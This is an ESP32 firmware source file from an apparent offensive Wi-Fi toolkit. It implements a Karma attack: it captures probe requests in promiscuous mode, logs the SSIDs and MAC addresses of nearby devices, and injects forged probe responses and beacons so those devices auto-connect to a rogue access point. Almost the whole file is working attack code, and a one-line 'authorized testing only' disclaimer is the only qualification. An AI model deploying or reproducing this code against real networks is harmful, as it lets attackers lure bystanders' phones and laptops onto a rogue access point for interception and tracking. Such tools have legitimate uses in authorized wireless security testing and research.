// ============================================================
// FireGod-ESP — Karma Attack
// Captures probe requests (directed SSID queries) in promiscuous
// mode and answers each with a probe-response + beacon for the
// requested SSID, so devices auto-associate with us. The RX callback
// only records (SSID + prober MAC) into a small ring; the module
// loop does the actual injection. Authorized testing only.
// ============================================================

#include "karma.h"
#include "fg_globals.h"
#include "core/wifi_manager.h"
#include "wifi_frames.h"
#include <esp_wifi.h>
#include <ctype.h>
#include <string.h>

#define KARMA_RING 24

struct KarmaReq {
    char    ssid[33];
    uint8_t prober[6];
};

static volatile uint32_t s_head = 0, s_tail = 0;
static KarmaReq      s_ring[KARMA_RING];
static portMUX_TYPE  s_mux = portMUX_INITIALIZER_UNLOCKED;
static volatile uint32_t s_seen = 0;

// Promiscuous RX: pick out probe-request mgmt frames (subtype 0x04).
static void karma_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
    const int len = pkt->rx_ctrl.sig_len;
    const uint8_t* p = pkt->payload;
    if (len < 28) return;

    const uint16_t fc = (uint16_t)p[0] | ((uint16_t)p[1] << 8);
    const uint8_t ftype = (fc & 0x0C) >> 2;
    const uint8_t fsub  = (fc & 0xF0) >> 4;
    if (ftype != 0x00 || fsub != 0x04) return;  // not a probe request

    // SSID element starts at offset 24 (no fixed params in probe req).
    if (p[24] != 0x00) return;                  // first tag must be SSID
    uint8_t slen = p[25];
    if (slen == 0 || slen > 32) return;         // skip wildcard/invalid
    if (24 + 2 + slen > len) return;

    KarmaReq r;
    for (int i = 0; i < slen; i++) {
        uint8_t c = p[26 + i];
        r.ssid[i] = isprint(c) ? (char)c : '.';
    }
    r.ssid[slen] = '\0';
    memcpy(r.prober, p + 10, 6);                // addr2 = prober

    portENTER_CRITICAL(&s_mux);
    uint32_t next = (s_head + 1) % KARMA_RING;
    if (next != s_tail) {                        // drop if ring full
        s_ring[s_head] = r;
        s_head = next;
    }
    portEXIT_CRITICAL(&s_mux);
    s_seen++;
}

// Pop one queued request; returns false if empty.
static bool karma_pop(KarmaReq* out) {
    bool got = false;
    portENTER_CRITICAL(&s_mux);
    if (s_tail != s_head) {
        *out = s_ring[s_tail];
        s_tail = (s_tail + 1) % KARMA_RING;
        got = true;
    }
    portEXIT_CRITICAL(&s_mux);
    return got;
}

void fg_karma(uint8_t channel) {
    if (channel < 1 || channel > 14) channel = FG_AP_CHANNEL;

    s_head = s_tail = s_seen = 0;
    fg_wifi_enter_tx_mode(channel);
    fg_wifi_enter_promiscuous(karma_cb);  // sets cb + promiscuous on

    fg_send_result_fmt(
        "{\"event\":\"log\",\"msg\":\"Karma listening on ch%u...\"}", (unsigned)channel);

    uint8_t src[6];
    fg_rand_mac(src);

    uint8_t resp[160], beacon[160];
    uint32_t answered = 0;
    uint32_t lastStat = millis();

    while (!g_stopRequested) {
        KarmaReq r;
        int handled = 0;
        while (karma_pop(&r) && handled < 8 && !g_stopRequested) {
            int rl = fg_build_probe_resp(resp, r.ssid, src, r.prober, channel);
            int bl = fg_build_beacon(beacon, r.ssid, src, channel, false);
            for (int k = 0; k < 3; k++) {
                fg_wifi_raw_tx(resp, rl);
                fg_wifi_raw_tx(beacon, bl);
            }
            answered++;
            handled++;
            // Surface the captured probe to the UI (table row).
            String pm = fg_mac_to_str(r.prober);
            fg_send_result_fmt(
                "{\"event\":\"karma\",\"ssid\":\"%s\",\"mac\":\"%s\"}",
                r.ssid, pm.c_str());
        }
        uint32_t now = millis();
        if (now - lastStat >= 1000) {
            lastStat = now;
            fg_send_result_fmt(
                "{\"event\":\"spam_stats\",\"type\":\"karma\",\"sent\":%lu,\"seen\":%lu,\"ch\":%u}",
                (unsigned long)answered, (unsigned long)s_seen, (unsigned)channel);
        }
        vTaskDelay(pdMS_TO_TICKS(20));
    }

    fg_wifi_exit_promiscuous();
    fg_send_result_fmt(
        "{\"event\":\"scan_complete\",\"type\":\"karma\",\"count\":%lu}",
        (unsigned long)answered);
}
